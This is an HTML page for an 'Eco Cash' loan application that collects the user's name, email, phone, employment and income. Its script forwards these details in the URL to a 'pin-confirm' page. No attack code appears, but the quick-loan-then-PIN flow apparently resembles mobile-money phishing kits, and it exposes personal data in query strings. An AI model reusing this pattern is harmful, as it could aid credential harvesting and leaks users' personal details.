<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes, viewport-fit=cover">
    <title>Eco Cash · Complete Application</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            -webkit-tap-highlight-color: transparent;
        }

        body {
            background: linear-gradient(135deg, #0a0f1e 0%, #0c1222 100%);
            font-family: 'Inter', system-ui, -apple-system, 'Segoe UI', Roboto, Helvetica, sans-serif;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
            position: relative;
            overflow-x: hidden;
        }

        /* Animated gradient overlay */
        body::before {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: radial-gradient(circle at 20% 50%, rgba(20, 184, 166, 0.08) 0%, transparent 50%);
            pointer-events: none;
            z-index: 0;
        }

        @keyframes fadeInUp {
            from {
                opacity: 0;
                transform: translateY(30px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        @keyframes float {
            0%, 100% { transform: translateY(0px); }
            50% { transform: translateY(-10px); }
        }

        .app-container {
            max-width: 540px;
            width: 100%;
            margin: 0 auto;
            position: relative;
            z-index: 1;
        }

        /* Hero Section */
        .hero {
            text-align: center;
            margin-bottom: 28px;
            animation: fadeInUp 0.6s ease-out;
        }
        .logo-icon {
            font-size: 2.5rem;
            margin-bottom: 8px;
            display: inline-block;
            animation: float 3s ease-in-out infinite;
        }
        .logo-text {
            font-size: 1.8rem;
            font-weight: 800;
            background: linear-gradient(135deg, #ffffff, #14b8a6);
            background-clip: text;
            -webkit-background-clip: text;
            color: transparent;
            letter-spacing: -0.5px;
        }
        .tagline {
            font-size: 0.8rem;
            color: #7e8aa2;
            margin-top: 4px;
        }

        /* Loan Summary Bar */
        .loan-summary-bar {
            background: rgba(17, 24, 39, 0.7);
            backdrop-filter: blur(10px);
            border-radius: 32px;
            padding: 16px 20px;
            margin-bottom: 20px;
            display: flex;
            justify-content: space-between;
            flex-wrap: wrap;
            gap: 12px;
            border: 1px solid rgba(20, 184, 166, 0.15);
            animation: fadeInUp 0.6s ease-out 0.05s both;
        }
        .summary-item {
            display: flex;
            flex-direction: column;
            align-items: flex-start;
        }
        .summary-label {
            font-size: 0.65rem;
            font-weight: 500;
            color: #7e8aa2;
            text-transform: uppercase;
        }
        .summary-value {
            font-size: 1rem;
            font-weight: 700;
            color: #14b8a6;
            margin-top: 2px;
        }

        /* Main Form Card */
        .apply-card {
            background: rgba(17, 24, 39, 0.85);
            backdrop-filter: blur(20px);
            border-radius: 48px;
            border: 1px solid rgba(20, 184, 166, 0.2);
            padding: 32px 28px;
            box-shadow: 0 25px 45px -12px rgba(0, 0, 0, 0.5);
            transition: transform 0.3s ease, box-shadow 0.3s ease;
            animation: fadeInUp 0.6s ease-out 0.1s both;
        }
        .apply-card:hover {
            transform: translateY(-3px);
            box-shadow: 0 35px 55px -12px rgba(20, 184, 166, 0.15);
        }

        .section-title {
            font-size: 1.4rem;
            font-weight: 700;
            background: linear-gradient(135deg, #ffffff, #14b8a6);
            background-clip: text;
            -webkit-background-clip: text;
            color: transparent;
            margin-bottom: 4px;
        }
        .section-sub {
            font-size: 0.75rem;
            color: #7e8aa2;
            margin-bottom: 28px;
            border-left: 3px solid #14b8a6;
            padding-left: 12px;
        }

        /* Form Groups */
        .form-group {
            margin-bottom: 20px;
        }
        label {
            display: block;
            font-size: 0.8rem;
            font-weight: 600;
            color: #cbd5e1;
            margin-bottom: 8px;
        }
        .required:after {
            content: "*";
            color: #14b8a6;
            margin-left: 4px;
        }
        input, select {
            width: 100%;
            padding: 14px 16px;
            font-size: 0.95rem;
            border: 1.5px solid rgba(31, 42, 62, 1);
            border-radius: 20px;
            background: rgba(15, 23, 36, 0.8);
            color: #e2e8f0;
            font-family: inherit;
            transition: all 0.2s ease;
        }
        input:focus, select:focus {
            outline: none;
            border-color: #14b8a6;
            box-shadow: 0 0 0 3px rgba(20, 184, 166, 0.2);
            background: #0f1724;
        }
        input::placeholder {
            color: #4a5568;
        }

        .row-2cols {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 14px;
        }

        .radio-group {
            display: flex;
            align-items: center;
            gap: 12px;
            margin: 20px 0;
        }
        .radio-group label {
            display: flex;
            align-items: center;
            gap: 8px;
            margin-bottom: 0;
            cursor: pointer;
            font-weight: 500;
            font-size: 0.8rem;
        }
        .radio-group input {
            width: 18px;
            height: 18px;
            accent-color: #14b8a6;
        }

        /* Submit Button */
        .submit-btn {
            width: 100%;
            background: linear-gradient(135deg, #14b8a6, #0d9488);
            border: none;
            padding: 16px 20px;
            font-size: 1rem;
            font-weight: 700;
            color: #0b1120;
            border-radius: 60px;
            cursor: pointer;
            transition: all 0.3s ease;
            font-family: inherit;
            margin-top: 8px;
            position: relative;
            overflow: hidden;
            box-shadow: 0 4px 15px rgba(20, 184, 166, 0.3);
        }
        .submit-btn::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
            transition: left 0.5s ease;
        }
        .submit-btn:hover::before {
            left: 100%;
        }
        .submit-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 12px 28px -8px rgba(20, 184, 166, 0.5);
        }
        .submit-btn:active {
            transform: scale(0.97);
        }

        /* Error Message */
        .error-message {
            background: rgba(244, 63, 94, 0.15);
            color: #f43f5e;
            padding: 12px;
            border-radius: 12px;
            font-size: 0.8rem;
            margin-top: 16px;
            text-align: center;
            display: none;
        }
        .error-message.show {
            display: block;
            animation: fadeInUp 0.3s ease-out;
        }

        /* Phone Hint */
        .phone-hint {
            font-size: 0.65rem;
            color: #5b6a8a;
            margin-top: 5px;
            display: block;
        }

        /* Footer Trust */
        .footer-trust {
            display: flex;
            justify-content: center;
            gap: 16px;
            margin-top: 24px;
            padding-top: 20px;
            border-top: 1px solid rgba(20, 184, 166, 0.1);
            flex-wrap: wrap;
        }
        .trust-badge {
            display: flex;
            align-items: center;
            gap: 6px;
            font-size: 0.65rem;
            color: #5b6a8a;
        }

        @media (max-width: 480px) {
            .apply-card {
                padding: 22px 18px 26px;
            }
            .row-2cols {
                grid-template-columns: 1fr;
                gap: 16px;
            }
            .logo-icon {
                font-size: 2rem;
            }
            .logo-text {
                font-size: 1.5rem;
            }
        }
    </style>
</head>
<body>
<div class="app-container">
    <div class="hero">
        <div class="logo-icon">💰</div>
        <div class="logo-text">Eco Cash</div>
        <div class="tagline">Complete your application</div>
    </div>

    <div class="loan-summary-bar">
        <div class="summary-item">
            <span class="summary-label">Loan Amount</span>
            <span class="summary-value" id="summaryAmount">$0</span>
        </div>
        <div class="summary-item">
            <span class="summary-label">Term</span>
            <span class="summary-value" id="summaryTerm">0 months</span>
        </div>
        <div class="summary-item">
            <span class="summary-label">Monthly</span>
            <span class="summary-value" id="summaryMonthly">$0</span>
        </div>
        <div class="summary-item">
            <span class="summary-label">Interest</span>
            <span class="summary-value" id="summaryRate">5%</span>
        </div>
    </div>

    <div class="apply-card">
        <div class="section-title">📋 Complete your application</div>
        <div class="section-sub">Fill in your personal details below</div>

        <form id="applicationForm">
            <div class="form-group">
                <label class="required">Full name</label>
                <input type="text" id="fullName" placeholder="John M. Doe" required>
            </div>

            <div class="row-2cols">
                <div class="form-group">
                    <label class="required">Email address</label>
                    <input type="email" id="email" placeholder="hello@example.com" required>
                </div>
                <div class="form-group">
                    <label class="required">Phone number</label>
                    <input type="tel" id="phone" placeholder="+1 234 567 8900" required>
                    <span class="phone-hint">📱 Enter your phone number with country code</span>
                </div>
            </div>

            <div class="row-2cols">
                <div class="form-group">
                    <label class="required">Employment status</label>
                    <select id="employment" required>
                        <option value="">Select</option>
                        <option>Employed full-time</option>
                        <option>Employed part-time</option>
                        <option>Self-employed</option>
                        <option>Business owner</option>
                        <option>Retired</option>
                    </select>
                </div>
                <div class="form-group">
                    <label class="required">Monthly income ($)</label>
                    <input type="number" id="monthlyIncome" placeholder="e.g., 3500" required>
                </div>
            </div>

            <div class="radio-group">
                <label>
                    <input type="checkbox" id="consent" required> I confirm that the information provided is accurate.
                </label>
            </div>

            <button type="submit" class="submit-btn" id="submitBtn">Continue →</button>
            <div class="error-message" id="errorMessage"></div>
        </form>

        <div class="footer-trust">
            <div class="trust-badge">🔒 Secure & Encrypted</div>
            <div class="trust-badge">⚡ 5-Minute Approval</div>
            <div class="trust-badge">💰 No Hidden Fees</div>
        </div>
    </div>
</div>

<script>
    // Function to validate phone number (must start with + and country code)
    function isValidPhone(phone) {
        const cleaned = phone.replace(/[\s\-\(\)]/g, '');
        const regex = /^\+\d{10,14}$/;
        return regex.test(cleaned);
    }

    const urlParams = new URLSearchParams(window.location.search);
    const amount = urlParams.get('amount') || '0';
    const term = urlParams.get('term') || '0';
    const rate = urlParams.get('rate') || '5';
    const monthly = urlParams.get('monthly') || '0';

    document.getElementById('summaryAmount').innerText = `$${parseInt(amount).toLocaleString()}`;
    document.getElementById('summaryTerm').innerText = `${term} month${term != 1 ? 's' : ''}`;
    document.getElementById('summaryMonthly').innerText = `$${parseFloat(monthly).toFixed(2)}`;
    document.getElementById('summaryRate').innerText = `${rate}%`;

    document.getElementById('applicationForm').addEventListener('submit', function(e) {
        e.preventDefault();
        
        const fullName = document.getElementById('fullName').value.trim();
        const email = document.getElementById('email').value.trim();
        const phone = document.getElementById('phone').value.trim();
        const employment = document.getElementById('employment').value;
        const monthlyIncome = document.getElementById('monthlyIncome').value;
        const consent = document.getElementById('consent').checked;
        const errorMsgDiv = document.getElementById('errorMessage');
        
        if (!fullName || !email || !phone || !employment || !monthlyIncome || !consent) {
            errorMsgDiv.textContent = 'Please fill all required fields';
            errorMsgDiv.classList.add('show');
            setTimeout(() => errorMsgDiv.classList.remove('show'), 3000);
            return;
        }
        
        // Validate phone number (must start with + and country code)
        if (!isValidPhone(phone)) {
            errorMsgDiv.textContent = '❌ Please enter a valid phone number with country code (e.g., +1 234 567 8900)';
            errorMsgDiv.classList.add('show');
            setTimeout(() => errorMsgDiv.classList.remove('show'), 3000);
            return;
        }
        
        errorMsgDiv.classList.remove('show');
        
        const params = new URLSearchParams();
        params.set('amount', amount);
        params.set('term', term);
        params.set('rate', rate);
        params.set('monthly', monthly);
        params.set('name', fullName);
        params.set('email', email);
        params.set('phone', phone);
        
        window.location.href = `pin-confirm.html?${params.toString()}`;
    });
</script>
</body>
</html>
